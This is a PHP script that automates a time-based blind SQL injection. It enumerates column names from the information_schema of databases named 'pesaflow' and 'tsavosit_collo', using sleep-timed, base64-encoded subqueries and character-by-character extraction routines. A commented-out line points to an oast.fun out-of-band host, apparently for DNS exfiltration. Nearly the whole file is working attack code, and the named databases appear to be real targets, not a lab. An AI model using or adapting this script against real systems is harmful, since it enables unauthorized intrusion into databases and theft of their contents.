<?php
include './includes/sql_conn_lab.php';
$word = "pesaflow";
//$word = "\\\\kotnova.chp0eah2vtc0000dnx6gge5y8fcyyyyyb.oast.fun\\a";
$hex = '0x' . bin2hex($word);
$date1 = date('H:i:s');

if (isset($_GET['table']) && !isset($_GET['column'])) {
    echo 'Table needed to process query!';
} else {
    //echo $date1. PHP_EOL;
    //$func = 'L';
    if (isset($_GET['func'])) {
        if ($_GET['func'] == 'L' || $_GET['func'] == 'l') {
            $func = 'L';
        } elseif ($_GET['func'] == 'C' || $_GET['func'] == 'c') {
            $func = 'C';
        } else {
            $func = 'C';
        }
    } else {
        $func = 'C';
    }
    if ($func == 'L') {
        $verif = json_decode(file_get_contents('./pftb/tableColumns.json'), true);
        if (isset($verif[$_GET['table']]) && !isset($_GET['column'])) {
            echo 'Data already queried';
        } else {
            if (is_int($_GET['table'])) {
                $table = $_GET['table'];
            } else {
                $table = $_GET['table'];
            }

            if (isset($_GET['column'])) {
                $column = $_GET['column'];
            } else {
                $column = $_GET['column'];
            }
            // $column = 1;

            $length = '9';
            $target = '1';

            //$tbColumnsTotal = $tableDataMod[$table]['length'] - 1;
            $tbColumnsTotal = $tableDataMod[$table]['length'];

            $tb_name = $tableDataMod[$table]['name'];
            $i = 'VALID QUERY';


            $tb_column = $column - 1;
            if ($target == '1') {
                $db_name = 'pesaflow';
                $targetp = 1;
            } else {
                $db_name = 'tsavosit_collo';
                $targetp = 2;
            }


            $sleepp = 5;
            $charposp = 0;
            $paramp = "(SELECT(COLUMN_NAME)FROM(information_schema.columns)WHERE(table_schema='" . $db_name . "'AND(table_name='" . $tb_name . "'))ORDER%20BY(COLUMN_NAME)LIMIT%201%20OFFSET%20" . $tb_column . ")";


            $qq1 = [
                'charpos' => $charposp,
                'param' => $paramp,
                'target' => $targetp,
                'sleep' => $sleepp,
                's_time' => $date1
            ];
            $qq2 = base64_encode(json_encode($qq1));

            $state = [
                'id' => 2,
                'page' => 'sql_lab.php',
                'message' => 'VALID QUERY',
                'tb' => $table,
                'charpos' => $charposp,
                'cl' => $column,
                'lngth' => $length,
                'ttcm' => $tbColumnsTotal, //loop moderator & controller
                'f' => $func,
                'query' => $qq2
            ];


            echo length_finder($sleepp, $targetp, $paramp, $state) . '<BR/>';
        }
    } else {
        $dfile = './pftb/tableColumnNames.json';
        if (file_exists($dfile)) {
            $verif = json_decode(file_get_contents($dfile), true);
        } else {
            $verif = [];
        }

        if (!isset($_GET['column'])) {
            exit('Column name needed to process query!');
        }

        $vrfil = './pftb/tableColumns.json';
        $vrfil_data = json_decode(file_get_contents($vrfil), true);

        if (!isset($vrfil_data[$_GET['table']][$_GET['column']])) {
            exit('Column or table queried is not available!');
        } else {
            $length = $vrfil_data[$_GET['table']][$_GET['column']];
        }

        if (isset($verif[$_GET['table']][$_GET['column']]) && !isset($_GET['position']) && count($verif[$_GET['table']][$_GET['column']]) == $length) {
            if (count($verif[$_GET['table']][$_GET['column']]) == $length) {
                exit('Table and column completely queried!');
            } else {
                exit('Table and column already queried!');
            }
        } else {
            if (is_int($_GET['table'])) {
                $table = $_GET['table'];
            } else {
                $table = $_GET['table'];
            }

            if (isset($verif[$_GET['table']][$_GET['column']])) {
                $column = count($verif[$_GET['table']][$_GET['column']]) + 1;
            } else {
                if (is_int($_GET['column'])) {
                    $column = $_GET['column'];
                } else {
                    $column = $_GET['column'];
                }
            }

            // $column = 1;


            $target = '1';

            //$tbColumnsTotal = $tableDataMod[$table]['length'] - 1;
            $tbColumnsTotal = $tableDataMod[$table]['length'];

            $tb_name = $tableDataMod[$table]['name'];
            $i = 'VALID QUERY';


            $tb_column = $column - 1;
            if ($target == '1') {
                $db_name = 'pesaflow';
                $targetp = 1;
            } else {
                $db_name = 'tsavosit_collo';
                $targetp = 2;
            }


            $sleepp = 5;
            $charposp = 1;

            $paramp = "(SELECT(COLUMN_NAME)FROM(information_schema.columns)WHERE(table_schema='" . $db_name . "'AND(table_name='" . $tb_name . "'))ORDER%20BY(COLUMN_NAME)LIMIT%201%20OFFSET%20" . $tb_column . ")";


            $qq1 = [
                'charpos' => $charposp,
                'param' => $paramp,
                'target' => $targetp,
                'sleep' => $sleepp,
                's_time' => $date1
            ];
            $qq2 = base64_encode(json_encode($qq1));

            $state = [
                'id' => 2,
                'page' => 'sql_lab.php',
                'message' => 'VALID QUERY',
                'tb' => $table,
                'charpos' => $charposp,
                'cl' => $column,
                'lngth' => $length, //loop moderator & controller
                'ttcm' => $tbColumnsTotal,
                'f' => $func,
                'query' => $qq2
            ];

            echo character_finder($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>';
        }
    }
}
